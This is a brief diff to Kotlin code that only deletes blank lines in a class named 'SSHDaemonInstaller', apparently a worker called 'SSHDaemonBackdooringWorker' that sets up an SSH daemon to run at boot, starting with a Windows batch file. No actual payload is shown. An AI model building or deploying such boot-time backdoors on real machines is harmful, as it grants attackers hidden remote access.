@@ -23,8 +23,6 @@ class SSHDaemonInstaller(
 ) : OnBootExecutorWorker("SSHDaemon", httpClient, entkerner) {
     override val name = "SSHDaemonBackdooringWorker"
 
-
-
     override fun installWindows(file: File) {
         if (entkerner.system == SystemType.WINDOWS) {
             val sshDaemonFile = File(file, "RunSshDaemon.bat")
